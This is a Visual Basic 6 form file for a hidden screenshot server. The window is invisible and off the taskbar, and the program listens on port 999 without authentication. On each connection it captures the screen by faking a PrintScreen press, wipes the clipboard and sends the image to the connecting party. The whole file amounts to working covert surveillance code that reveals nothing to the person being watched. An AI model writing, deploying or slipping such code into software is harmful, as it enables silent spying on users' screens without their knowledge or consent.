VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmScreenShotServer 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Simple Transfer Server"
   ClientHeight    =   2715
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   4845
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2715
   ScaleWidth      =   4845
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.ListBox lstevents 
      Height          =   1620
      Left            =   840
      TabIndex        =   0
      Top             =   360
      Width           =   2775
   End
   Begin MSWinsockLib.Winsock Winsock 
      Left            =   120
      Top             =   120
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "frmScreenShotServer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Const CHUNK_SIZE As Long = 1459 ' optimized packet size for TCP packet
'Private Const CHUNK_SIZE As Long = 4096 ' 4KB.
'Private Const CHUNK_SIZE As Long = 3072 ' 3KB.
'Private Const CHUNK_SIZE As Long = 1536 ' 1.5KB.
'Private Const CHUNK_SIZE As Long = 6144 ' 6KB.
'Private Const CHUNK_SIZE As Long = 1024 ' 1KB.

Private Const VK_SNAPSHOT = &H2C
'set to true if you wish to write to the debug.txt file
Const DEBUG_FLAG As Boolean = False

Private blnTransferring As Boolean
Private lngFilePos      As Long
Private strFilename     As String
Private hFile           As Long
Dim cliperror           As Integer

Private Declare Sub keybd_event Lib "user32" _
    (ByVal bVk As Byte, _
    ByVal bScan As Byte, _
    ByVal dwFlags As Long, _
    ByVal dwExtraInfo As Long)

Private Declare Function Sleep Lib "kernel32" (ByVal dwmilliseconds As Long) As Long

Private Sub Form_Load()
    'start listening.
    Call StartServer
    If DEBUG_FLAG Then
        Open "debug.txt" For Append As #9
            Write #9, "started server"
        Close #9
    End If
End Sub

Private Sub StartServer()
    ' Set the Winsock up to listen on port 999.
    With Winsock
        Call .Close
        .LocalPort = 999
        Call .Listen
    End With
    If DEBUG_FLAG Then
        Open "debug.txt" For Append As #9
            Write #9, "listening on " & Winsock.LocalPort
        Close #9
    End If
    'Call lstEvents.AddItem("Server started, listening on 999")
    lngFilePos = 0
    strFilename = ""
    blnTransferring = False
End Sub

Private Sub SendFile(ByVal strFile As String)
    If DEBUG_FLAG Then
        Open "debug.txt" For Append As #9
            Write #9, "sending file"
        Close #9
    End If
    ' Store the filename for later.
    strFilename = strFile
    'Call lstEvents.AddItem("Sending BOF: " & strFilename)
    ' Set the transferring flag (since we're now connected), and send the BOF
    ' marker - this instructs the remote host that a file is on it's way.
    blnTransferring = True
    Call Winsock.SendData("BOF" & strFilename)
    If DEBUG_FLAG Then
        Open "debug.txt" For Append As #9
            Write #9, "sending bof"
        Close #9
    End If
    DoEvents
    If DEBUG_FLAG Then
        Open "debug.txt" For Append As #9
            Write #9, "end of sendfile function"
        Close #9
    End If
End Sub

Private Sub SendNextChunk()
    If DEBUG_FLAG Then
        Open "debug.txt" For Append As #9
            Write #9, "sending next chunk"
        Close #9
    End If
    Dim lngChunkSize  As Long
    Dim strData       As String
    ' not currently connected and transferring
    If (Not blnTransferring) Then Exit Sub
    ' read the next unsent piece of the file
    If (lngFilePos = 0) Then lngFilePos = 1
    Seek hFile, lngFilePos
    ' size chunk
    lngChunkSize = LOF(hFile) + 1 - lngFilePos
    If (lngChunkSize > CHUNK_SIZE) Then lngChunkSize = CHUNK_SIZE
    ' chunksize = 0, no data left transfer complete.
    If (lngChunkSize = 0) Then
        ' Send the EOF
        strData = "EOF"
        blnTransferring = False
        'Call lstEvents.AddItem("0 bytes, transfer completed. Sending EOF.")
        ' Send the data to the remote host.
        Call Winsock.SendData(strData)
        If DEBUG_FLAG Then
            Open "debug.txt" For Append As #9
                Write #9, "sending eof"
            Close #9
        End If
        DoEvents
        Winsock.Close
        Close #hFile
        'Call lstEvents.AddItem("File Closed.")
        If DEBUG_FLAG Then
            Open "debug.txt" For Append As #9
            Write #9, "closing file"
            Close #9
        End If
        
        Call StartServer
        If DEBUG_FLAG Then
            Open "debug.txt" For Append As #9
            Write #9, "restarted server"
            Close #9
        End If
    Else
        ' Grab the data from the file & increment file pointer
        strData = String$(lngChunkSize, 0)
        Get #hFile, , strData
        lngFilePos = lngFilePos + lngChunkSize
        ' Send the data
        Call Winsock.SendData(strData)
        If DEBUG_FLAG Then
            Open "debug.txt" For Append As #9
                Write #9, "next chunk sent"
            Close #9
        End If
        'Call lstEvents.AddItem("Sent " & lngChunkSize & " bytes")
        'DoEvents
    End If
End Sub

Private Sub Winsock_ConnectionRequest(ByVal requestID As Long)
    If DEBUG_FLAG Then
        Open "debug.txt" For Append As #9
            Write #9, "there has been a connection request"
        Close #9
    End If
    ' Accept the incoming connection from the client.
    With Winsock
        Call .Close
        Call .Accept(requestID)
    End With
    'Call lstEvents.AddItem("Incoming connection request, accepted")
    If DEBUG_FLAG Then
        Open "debug.txt" For Append As #9
            Write #9, "accepted connection"
        Close #9
    End If
    'Call lstEvents.AddItem("Taking Screenshot")
    Call takeSS
    If DEBUG_FLAG Then
        Open "debug.txt" For Append As #9
            Write #9, "took ss"
        Close #9
    End If
    'Call lstEvents.AddItem("Starting Transfer")
    Call startTransfer
    If DEBUG_FLAG Then
        Open "debug.txt" For Append As #9
            Write #9, "starting transfer"
        Close #9
    End If
End Sub

Private Sub Winsock_DataArrival(ByVal bytesTotal As Long)
    If DEBUG_FLAG Then
        Open "debug.txt" For Append As #9
            Write #9, "incoming data"
        Close #9
    End If
    Dim strData As String
    ' Grab the incoming data and check it.
    Call Winsock.GetData(strData)
    If (strData = "NEXT") Then
        If DEBUG_FLAG Then
            Open "debug.txt" For Append As #9
                Write #9, "incoming data is a next command"
            Close #9
        End If
        ' The remote host has asked for the NEXT chunk.. so send it to them!
        'Call lstEvents.AddItem("Sending next chunk.")
        If DEBUG_FLAG Then
            Open "debug.txt" For Append As #9
                Write #9, "next recieved calling the sendnextchunk function"
            Close #9
        End If
        Call SendNextChunk
    End If
End Sub

Private Sub Winsock_Error( _
    ByVal Number As Integer, _
    Description As String, _
    ByVal Scode As Long, _
    ByVal Source As String, _
    ByVal HelpFile As String, _
    ByVal HelpContext As Long, _
    CancelDisplay As Boolean)
    If DEBUG_FLAG Then
        Open "debug.txt" For Append As #9
            Write #9, "there has been a winsock error: " & Description
        Close #9
    End If
    'An error has occurred somewhere. Shutdown the connection, and restart the server.
    Call Winsock.Close
    blnTransferring = False
    Call StartServer
End Sub

Private Sub startTransfer()
    'send screentshot
    'Open file
    If DEBUG_FLAG Then
        Open "debug.txt" For Append As #9
            Write #9, "starting transfer"
        Close #9
    End If
    hFile = FreeFile
    Open App.Path + "\screen.bmp" For Binary As #hFile
    If DEBUG_FLAG Then
        Open "debug.txt" For Append As #9
            Write #9, "file opened"
        Close #9
    End If
    'Call lstEvents.AddItem("File Opened.")
    If DEBUG_FLAG Then
        Open "debug.txt" For Append As #9
            Write #9, "calling sendfile function"
        Close #9
    End If
    Call SendFile("screen.bmp")
End Sub

Private Sub takeSS()
    If DEBUG_FLAG Then
        Open "debug.txt" For Append As #9
            Write #9, "taking ss"
        Close #9
    End If
    'take screenshot
    Call keybd_event(VK_SNAPSHOT, 0, 0, 0)
    'save screenshot
'
    
    'if picture exists, delete it first
    If FileExists("screen.bmp") Then
        Dim fs
        Set fs = CreateObject("scripting.filesystemobject")
        fs.deletefile "screen.bmp"
    End If
    Sleep (1000)
    On Error GoTo error_trap
    SavePicture Clipboard.GetData(vbCFBitmap), App.Path + "\screen.bmp"

    'If cliperror <> 251 Then
       'reset the cliperror flag
    '   cliperror = 0
       'retry the cliboard call
    '   GoTo x
    'End If
    'GoTo retry
'x:
    VB.Clipboard.Clear
'trap_error:
     'wait for clipboard to catch up
    'Call Sleep(500)
    'cliperror = 251
    'Resume Next
    If DEBUG_FLAG Then
        Open "debug.txt" For Append As #9
            Write #9, "took ss - end of takess funtion"
    Close #9
    End If
    Exit Sub
error_trap:
    Sleep (1000)
    Resume
End Sub

Function FileExists(filename As String) As Integer
    If DEBUG_FLAG Then
        Open "debug.txt" For Append As #9
            Write #9, "checking if file exists"
        Close #9
    End If
    Dim f As Integer
    'trap any errors
    On Error Resume Next
    f = FreeFile
    'open for reading
    Open filename For Input As #f
    'close file
    Close #f
    'if there was an erro err will <> 0 return false
    FileExists = Not (Err <> 0)
End Function
